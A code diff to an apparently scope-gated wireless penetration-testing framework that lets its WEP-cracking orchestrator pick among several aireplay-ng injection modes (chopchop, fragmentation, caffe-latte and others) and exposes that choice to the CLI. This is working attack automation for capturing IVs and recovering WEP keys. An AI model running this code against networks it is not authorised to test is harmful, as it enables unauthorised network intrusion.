@@ -22,12 +22,16 @@ import tempfile
 from dataclasses import dataclass
 from pathlib import Path
 
-from netreaper.core.exceptions import SubprocessError, ToolNotFoundError
+from netreaper.core.exceptions import (
+    ConfigurationError,
+    SubprocessError,
+    ToolNotFoundError,
+)
 from netreaper.core.logging import get_logger
 from netreaper.core.process import ProcessRunner, get_process_runner
 from netreaper.orchestration.events import Events, event_bus
 from netreaper.safety.scope import Tier
-from netreaper.tools.aireplay import AireplayTool
+from netreaper.tools.aireplay import AireplayTool, AttackMode
 from netreaper.tools.airodump import AirodumpTool
 
 logger = get_logger(__name__)
@@ -68,6 +72,20 @@ async def crack_capture(
     return parse_aircrack_key(result.stdout + (result.stderr or ""))
 
 
+# Every WEP injection strategy the aireplay-ng wrapper already implements.
+# wep.py drove only "arpreplay" and the CLI exposed no choice at all (#47).
+INJECTION_MODES = frozenset(
+    {
+        "arpreplay",
+        "chopchop",
+        "fragment",
+        "caffe_latte",
+        "cfrag",
+        "interactive",
+    }
+)
+
+
 @dataclass
 class WepResult:
     bssid: str
@@ -103,6 +121,7 @@ class WepAttack:
         capture_seconds: int = 30,
         max_rounds: int = 5,
         use_arpreplay: bool = True,
+        injection: str = "arpreplay",
         settle_seconds: int = 3,
     ) -> WepResult:
         """Capture IVs (injection-assisted) and crack, retrying up to max_rounds.
@@ -116,9 +135,21 @@ class WepAttack:
             output: .cap prefix; a temp file is used when omitted.
             capture_seconds: IV-collection window per round.
             max_rounds: Capture+crack rounds before giving up.
-            use_arpreplay: Run ARP replay to speed up IV collection.
+            use_arpreplay: Run ARP replay to speed up IV collection. Kept for
+                compatibility; False still means "no injection".
+            injection: Which injection strategy to drive IV collection with.
+                One of INJECTION_MODES. The primitives for chopchop,
+                fragmentation, caffe-latte, cfrag and interactive replay already
+                existed in tools/aireplay.py and were simply never called from
+                here, and the CLI exposed no way to pick one (issue #47), so the
+                orchestrator only ever ran fakeauth + ARP replay.
             settle_seconds: Delay before injecting so airodump is on-channel.
         """
+        # Validate the strategy BEFORE any setup. Deferring it to _injector()
+        # meant a typo only surfaced mid-attack, after the capture had been
+        # arranged, and behind a scope denial if the engagement was wrong too.
+        self._injector(injection)
+
         prefix, cleanup = self._resolve_prefix(output)
         result = WepResult(bssid=bssid, channel=channel)
         try:
@@ -126,7 +157,7 @@ class WepAttack:
                 result.rounds = attempt
                 cap_path = await self._one_round(
                     interface, bssid, channel, essid, source_mac, prefix,
-                    capture_seconds, use_arpreplay, settle_seconds,
+                    capture_seconds, use_arpreplay, settle_seconds, injection,
                 )
                 key = await self._cracker(cap_path, bssid)
                 if key:
@@ -155,6 +186,7 @@ class WepAttack:
         capture_seconds: int,
         use_arpreplay: bool,
         settle_seconds: int,
+        injection: str = "arpreplay",
     ) -> Path:
         """Capture IVs while injecting ARP traffic. Returns the cap path."""
         cap_task = asyncio.create_task(
@@ -171,7 +203,7 @@ class WepAttack:
                 )
                 if use_arpreplay:
                     replay_task = asyncio.create_task(
-                        self._aireplay.arpreplay_attack(interface, bssid, source_mac)
+                        self._injector(injection)(interface, bssid, source_mac)
                     )
             await cap_task
         except BaseException:
@@ -191,6 +223,47 @@ class WepAttack:
                 ):
                     await replay_task
         return Path(f"{prefix}-01.cap")
+
+    def _injector(self, injection: str):
+        """Pick the injection coroutine for a named strategy.
+
+        Every one of these is an existing aireplay-ng primitive; the gap in #47
+        was that only arpreplay was ever reachable. Each still goes through the
+        tool wrapper, so each is scope-gated and audited at the seam exactly as
+        ARP replay is.
+        """
+        name = (injection or "arpreplay").strip().lower()
+        if name not in INJECTION_MODES:
+            raise ConfigurationError(
+                f"unknown WEP injection mode {injection!r}; "
+                f"choose one of: {', '.join(sorted(INJECTION_MODES))}"
+            )
+        a = self._aireplay
+        # Resolve LAZILY. Building the whole table up front touched
+        # chopchop_attack and fragment_attack even when only arpreplay was
+        # wanted, so any caller or test double that implements just the
+        # primitive it uses died on an AttributeError.
+        named = {"arpreplay": "arpreplay_attack",
+                 "chopchop": "chopchop_attack",
+                 "fragment": "fragment_attack"}
+        if name in named:
+            return getattr(a, named[name])
+
+        # caffe-latte, cfrag and interactive have no named helper on the wrapper,
+        # so drive them through execute() with the mode the wrapper already maps.
+        mode = {
+            "caffe_latte": AttackMode.CAFFE_LATTE,
+            "cfrag": AttackMode.CFRAG,
+            "interactive": AttackMode.INTERACTIVE,
+        }[name]
+
+        async def _run(iface: str, target_bssid: str, source: str):
+            return await a.execute(
+                iface,
+                {"attack": mode, "bssid": target_bssid, "source_mac": source},
+            )
+
+        return _run
 
     @staticmethod
     def _resolve_prefix(output: str | None):
@@ -216,8 +289,13 @@ async def crack_wep(
     output: str | None = None,
     capture_seconds: int = 30,
     max_rounds: int = 5,
+    injection: str = "arpreplay",
 ) -> WepResult:
-    """Stateless one-shot WEP attack for the CLI."""
+    """Stateless one-shot WEP attack for the CLI.
+
+    ``injection`` selects the IV-generation strategy; see INJECTION_MODES. The
+    CLI had no way to choose one, which is half of #47's WEP gap.
+    """
     return await WepAttack().run(
         interface,
         bssid,
@@ -227,4 +305,5 @@ async def crack_wep(
         output=output,
         capture_seconds=capture_seconds,
         max_rounds=max_rounds,
+        injection=injection,
     )
